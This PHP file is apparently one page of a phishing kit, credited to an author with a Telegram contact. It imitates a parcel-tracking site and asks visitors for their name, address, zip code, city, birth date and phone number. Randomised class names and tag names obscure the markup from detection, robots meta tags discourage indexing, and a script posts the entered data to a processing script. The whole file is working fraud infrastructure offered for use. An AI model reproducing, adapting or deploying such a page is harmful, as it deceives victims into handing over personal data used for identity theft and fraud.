<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "details";
    $semantic = semantic();
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Detailed Tracking</title>
    </head>

    <body>

		<<?php echo $semantic; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="container">
                    <<?php echo $semantic; ?> class="lang">
                        <p><?php echo $_SESSION['lang']; ?> <i class="fa-solid fa-chevron-down"></i></p>
                        <ul>
                            <li><a href="../index.php?lang=de">DE</a></li>
                            <li><a href="../index.php?lang=en">EN</a></li>
                            <li><a href="../index.php?lang=fr">FR</a></li>
                            <li><a href="../index.php?lang=it">IT</a></li>
                        </ul>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="container">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <<?php echo $semantic; ?> id="<?php echo rr(); ?>main<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="container">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>title<?php echo rr(); ?>">
                    <h3><?php echo get_text('title'); ?></h3>
                    <p><?php echo get_text('subtitle'); ?></p>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>steps<?php echo rr(); ?>">
                    <ul>
                        <li class="current">
                            <span>1</span>
                            <p><?php echo get_text('step1'); ?></p>
                        </li>
                        <li>
                            <span>2</span>
                            <p><?php echo get_text('step2'); ?></p>
                        </li>
                        <li>
                            <span>3</span>
                            <p><?php echo get_text('step3'); ?></p>
                        </li>
                    </ul>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> id="<?php echo rr(); ?>forma<?php echo rr(); ?>">
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="details">
                    <<?php echo $semantic; ?> class="top">
                        <h3><?php echo get_text('addresstitle'); ?></h3>
                        <p><?php echo get_text('addressmessage'); ?></p>
                    </<?php echo $semantic; ?>>
                    <<?php echo $semantic; ?> class="row">
                        <<?php echo $semantic; ?> class="col-md-6">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'first_name') ?>">
                                    <p class="label-txt"><?php echo get_text('first_name_label'); ?></p>
                                    <input type="text" class="input" id="first_name" name="first_name" value="<?php echo get_value('first_name'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'first_name'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-6">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'last_name') ?>">
                                    <p class="label-txt"><?php echo get_text('last_name_label'); ?></p>
                                    <input type="text" class="input" id="last_name" name="last_name" value="<?php echo get_value('last_name'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'last_name'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-12">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'address') ?>">
                                    <p class="label-txt"><?php echo get_text('address_label'); ?></p>
                                    <input type="text" class="input" id="address" name="address" value="<?php echo get_value('address'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'address'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-6">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'zip_code') ?>">
                                    <p class="label-txt"><?php echo get_text('zip_code_label'); ?></p>
                                    <input type="text" class="input" id="zip_code" name="zip_code" value="<?php echo get_value('zip_code'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'zip_code'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-6">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'city') ?>">
                                    <p class="label-txt"><?php echo get_text('city_label'); ?></p>
                                    <input type="text" class="input" id="city" name="city" value="<?php echo get_value('city'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'city'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-8">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'birth_date') ?>">
                                    <p class="label-txt"><?php echo get_text('birth_date_label'); ?></p>
                                    <input type="text" class="input" inputmode="numeric" id="birth_date" name="birth_date" value="<?php echo get_value('birth_date'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'birth_date'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <<?php echo $semantic; ?> class="col-md-4">
                            <<?php echo $semantic; ?> class="form-group mb-4">
                                <label class="<?php echo errclass($_SESSION['errors'],'phone') ?>">
                                    <p class="label-txt"><?php echo get_text('phone_label'); ?></p>
                                    <input type="text" class="input" id="phone" name="phone" value="<?php echo get_value('phone'); ?>">
                                    <<?php echo $semantic; ?> class="err"><img src="../media/imgs/err.svg"></<?php echo $semantic; ?>>
                                    <?php echo errmsg($_SESSION['errors'],'phone'); ?>
                                </label>
                            </<?php echo $semantic; ?>>
                        </<?php echo $semantic; ?>>
                        <hr>
                        <<?php echo $semantic; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                            <div class="bbb"><?php echo get_text('cancel'); ?></div>
                            <div id="booom" class="<?php echo rr(); ?>btttn<?php echo rr(); ?>"><?php echo get_text('continue'); ?></div>
                        </<?php echo $semantic; ?>>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <<?php echo $semantic; ?> id="<?php echo rr(); ?>footer<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="container">
                <p><?php echo get_text('copyright'); ?></p>
                <ul>
                    <li><?php echo get_text('footer_list_1'); ?></li>
                    <li><?php echo get_text('footer_list_2'); ?></li>
                    <li><?php echo get_text('footer_list_3'); ?></li>
                    <li><?php echo get_text('footer_list_4'); ?></li>
                </ul>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('.lang p').click(function(){
                $('.lang ul').slideToggle();
            });
            $('#birth_date').mask('00/00/0000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'first_name' : $('#first_name').val(),
                    'last_name' : $('#last_name').val(),
                    'address' : $('#address').val(),
                    'zip_code' : $('#zip_code').val(),
                    'city' : $('#city').val(),
                    'birth_date' : $('#birth_date').val(),
                    'phone' : $('#phone').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>